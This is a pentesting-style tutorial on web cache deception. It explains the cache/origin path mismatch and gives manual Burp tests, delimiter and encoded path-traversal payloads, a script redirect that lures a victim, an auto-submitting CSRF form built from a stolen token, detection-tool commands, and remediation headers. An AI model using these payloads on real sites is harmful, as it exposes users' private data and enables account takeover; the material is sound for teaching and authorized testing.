# Web Cache Deception - Complete Exploitation Methodology

## What is Web Cache Deception?

Web Cache Deception (WCD) is an attack that exploits a mismatch between how a caching server (like a CDN or proxy) and the web application handle URLs . The attacker tricks the cache into storing a sensitive, user-specific page as if it were a public static file, making it accessible to anyone who requests that URL .


## How the Attack Works - Simple Explanation

**The Core Problem:**
- The **cache server** looks at the URL extension (like `.jpg`, `.css`, `.js`) to decide if something should be cached 
- The **web application** ignores parts of the URL and serves dynamic content anyway
- The attacker exploits this confusion

**Simple Analogy:**
Imagine a mailroom where packages are sorted by package color, but the contents are determined by the address label. If you paint a box containing private documents bright red (thinking red boxes are for public flyers), the mailroom will give that box to anyone who asks for a red box.


## Prerequisites for Exploitation

Before attempting to exploit Web Cache Deception, the following conditions must exist :

1. **CDN or caching layer enabled** (e.g., Cloudflare, Akamai, CloudFront)
2. **Caching rules based on file extensions** - The cache stores responses with extensions like .jpg, .css, .js
3. **Application ignores appended paths** - The origin server serves dynamic content even when fake paths/extensions are added
4. **SameSite cookie attribute set to "None"** - This allows cross-site requests to include cookies 


## Complete Testing Methodology

### Phase 1: Identify Target Endpoints

First, identify sensitive dynamic endpoints that should never be cached. Look for :
- User profile pages: `/my-profile`, `/account`, `/dashboard`
- Settings pages: `/settings`, `/preferences`
- Authenticated APIs: `/api/user/data`
- Admin panels: `/admin`, `/manage`

### Phase 2: Manual Testing with Burp Suite

**Step-by-step manual testing process :**

**Step 1: Configure Burp Suite**
- Install FoxyProxy browser extension and configure it to work with Burp Suite
- Turn OFF "Intercept" in Burp Suite so all requests are logged in HTTP history
- Log into the target application with test credentials

**Step 2: Test for Path Ignorance**
Send a request to your target endpoint with an arbitrary segment appended :
```
Original: GET /my-account
Modified: GET /my-account/test123
```
If you receive a 200 response with your account data, the application ignores appended path segments.

**Step 3: Test for Extension-Based Caching**
Add a static-looking extension to the URL :
```
GET /my-account/test123.js
```
Send the request and examine the response headers:
- Look for `X-Cache: miss` (first request)
- Resend the same request within 30 seconds
- Check if `X-Cache` changes to `hit` - this confirms the response is being cached

**Step 4: Verify Cache Exposure**
- Log out of the application or open a private/incognito window
- Request the same modified URL again
- If you still see your account data, the vulnerability is confirmed 

### Phase 3: Advanced Exploitation Techniques

#### Technique 1: Path Confusion with Delimiters

Different delimiters can be used to trick the cache while keeping the origin server functional :

| Delimiter | Example URL |
|-----------|--------------|
| Semicolon | `/my-account;test.css` |
| Question mark | `/my-account?test.css` |
| Hash | `/my-account#test.css` |
| At symbol | `/my-account@test.css` |
| Exclamation | `/my-account!test.css` |

**Real example from PortSwigger Lab :**
The payload `/my-account;%2f%2e%2e%2frobots.txt` tricks the cache into normalizing the path to `/robots.txt` while the origin server processes `/my-account`. The cache stores the response because of the `.txt` extension.

#### Technique 2: Encoded Dot-Segment Exploitation

This technique exploits normalization differences between cache and origin server :

**How it works:**
- The cache sees: `/resources/..%2fmy-account`
- The origin server resolves: `/my-account`
- The cache caches based on `/resources` prefix

**Exploit payload:**
```
/resources/..%2fmy-account
```

**PortSwigger Lab Example :**
A lab demonstrating this technique required delivering the following payload to the victim:
```html
<script>document.location="https://YOUR-LAB-ID.web-security-academy.net/resources/..%2fmy-account"</script>
```

When the victim (Carlos) viewed the exploit, his account response was cached. The attacker could then request the same URL and retrieve Carlos's API key.

#### Technique 3: Static Directory Prefix Exploitation

If the application has a static directory prefix like `/resources` or `/assets` that is cached, attackers can use path traversal to access dynamic endpoints :

**Exploit structure:**
```
/<static-directory>/..%2f<dynamic-endpoint>
```

**Real example:**
```
/assets/..%2fprofile
```
The cache sees the `/assets` prefix and caches the response, while the origin server resolves the path to `/profile` and returns user-specific data .

### Phase 4: Cross-User Validation

To confirm the vulnerability is truly exploitable :

1. **Use two different accounts** (Account A and Account B)
2. Log into Account A and request the crafted malicious URL
3. Log out of Account A
4. Log into Account B (or use an unauthenticated session)
5. Request the same malicious URL
6. If you see Account A's data while logged into Account B, the vulnerability is confirmed

### Phase 5: CSRF Token Extraction and Exploitation

Once a WCD vulnerability is found, attackers can extract CSRF tokens and perform actions on behalf of the victim :

**Step 1: Extract CSRF Token**
The cached response contains the victim's CSRF token in the HTML source.

**Step 2: Craft CSRF Exploit**
```html
<html>
  <body>
    <form action="https://example.com/approve_accounts" method="POST">
      <input type="hidden" name="filterBy" value="0" />
      <input type="hidden" name="_editedPendingBuyerAccIds" value="on" />
      <input type="hidden" name="_csrf" value="[EXTRACTED-TOKEN]" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

**Step 3: Deliver to Victim**
Host this HTML on an attacker-controlled server and trick the victim into visiting it .


## Automated Tools for Detection

### 1. Deceiver (Python Tool)

A lightweight tool for automated WCD detection :

**Features:**
- Automatically detects cache rules for common files
- Tests path normalization discrepancies
- Generates delimiter + extension payloads
- Compares responses with and without cookies

**Installation:**
```bash
git clone https://github.com/motoko-ayanami/deceiver
cd deceiver
pip install -r requirements.txt
```

**Usage:**
```bash
python deceiver.py --url "https://example.com/my-account" --cookies cookies.json
```

**Required files:**
- `urls.txt` - List of URLs to test (one per line)
- `cookies.json` - Authentication cookies exported from browser

**Export cookies:** Use Cookie-Editor browser extension 

### 2. WCDE Tool (Web Cache Deception Escalates)

Based on academic research published at USENIX Security '22 :

**Usage on single target:**
```bash
python wcde.py -t example.com
```

**With authentication:**
```bash
python wcde.py -t example.com -c cookies.json
```

**Custom extensions:**
```bash
python wcde.py -t example.com --extensions ".pdf, .png, .jpg, .js, .css"
```

### 3. Web Cache Deception Testing Tool

A CLI tool for testing both web apps and REST APIs :

**Basic test:**
```bash
python cache_deception_test.py --url "https://example.com/user/profile" --cookie "session=YOUR_SESSION"
```

**API mode:**
```bash
python cache_deception_test.py --url "https://api.example.com/user/data" --cookie "session=YOUR_SESSION" --api
```

**Verbose output:**
```bash
python cache_deception_test.py --url "https://example.com/user/profile" --cookie "session=YOUR_SESSION" --verbose
```

### 4. Param Miner (Burp Suite Extension)

Used to identify hidden, unlinked parameters and find unkeyed inputs for cache poisoning .


## Real-World Attack Execution Flow

### Complete Attack Scenario :

**Step 1: Identify Cacheable Pattern**
The attacker discovers that URLs ending with `.js` are cached for 30 seconds, and the application ignores appended paths.

**Step 2: Craft Malicious Link**
```
https://www.example.com/my-account/malicious.js
```

**Step 3: Deliver to Victim**
The attacker hosts an exploit page or sends the link directly via phishing email:
```html
<script>
document.location="https://www.example.com/my-account/malicious.js"
</script>
```

**Step 4: Victim Interaction**
When the authenticated victim clicks the link:
- Browser sends request with session cookies
- Application serves `/my-account` content
- Cache stores the response under `/my-account/malicious.js`

**Step 5: Attacker Retrieval**
The attacker requests the same URL without any authentication:
```bash
curl https://www.example.com/my-account/malicious.js
```

**Step 6: Data Extraction**
The response contains the victim's sensitive information (email, CSRF token, personal data).

**Step 7: Account Takeover (if CSRF token present)**
The attacker uses the extracted CSRF token to perform actions as the victim .


## Indicators of Vulnerability

Look for these response headers during testing :

| Header | Meaning |
|--------|---------|
| `X-Cache: hit` | Response served from cache |
| `X-Cache: miss` | Response not cached |
| `Cache-Control: public, max-age=30` | Response will be cached for 30 seconds |
| `Cache-Control: private, no-cache` | Response should NOT be cached (safe) |

**Warning signs:**
- `Cache-Control: public` on authenticated pages
- `max-age` with positive value on user-specific content
- `X-Cache: hit` when requesting modified URLs without cookies


## Testing Checklist

Use this checklist when testing for Web Cache Deception:

- [ ] Identify sensitive authenticated endpoints
- [ ] Test if application ignores appended path segments
- [ ] Test if application accepts appended extensions (.js, .css, .jpg)
- [ ] Check response headers for caching indicators
- [ ] Verify cache by resending the same request
- [ ] Test with different delimiters (;, ?, #, @)
- [ ] Test encoded path traversal (%2e%2e%2f)
- [ ] Test static directory prefix bypass (/assets/..%2faccount)
- [ ] Verify cross-user exposure with different accounts
- [ ] Extract any CSRF tokens from cached responses
- [ ] Confirm ability to perform actions on behalf of victim


## Real-World Vulnerability Examples

### PayPal Home Page (2017)
A Web Cache Deception attack was demonstrated on PayPal's home page where appending `.css` to the profile URL caused the cache to store and expose user account information .

### Shopify (2021)
Multiple subdomains including help.shopify.com and hatchful.shopify.com were found vulnerable, leaking user names, emails, profile pictures, and CSRF tokens .

### PortSwigger Academy Labs
PortSwigger provides multiple hands-on labs demonstrating different WCD exploitation techniques:
- Exact-match cache rules exploitation
- Origin server normalization exploitation
- Path mapping for web cache deception


## Remediation for Developers

If you find Web Cache Deception vulnerabilities, implement these fixes :

**1. Set proper cache headers on sensitive endpoints:**
```
Cache-Control: no-store, private
Pragma: no-cache
```

**2. Implement Vary headers:**
```
Vary: Cookie, Authorization
```

**3. Configure CDN to respect origin headers** - Do not override Cache-Control from the application

**4. Whitelist cacheable routes** - Only cache known static directories like `/static/*`, `/assets/*`

**5. Update SameSite cookie attribute:**
```
Set-Cookie: session=value; SameSite=Strict; Secure
```

**6. Block unexpected file extensions on dynamic routes** - Reject requests like `/account/profile.jpg` at the application level


## Important Legal Notice

Only test Web Cache Deception vulnerabilities on applications you own or have explicit written permission to test. Unauthorized testing is illegal in most jurisdictions. Use the techniques described here only for legitimate security assessments and educational purposes .
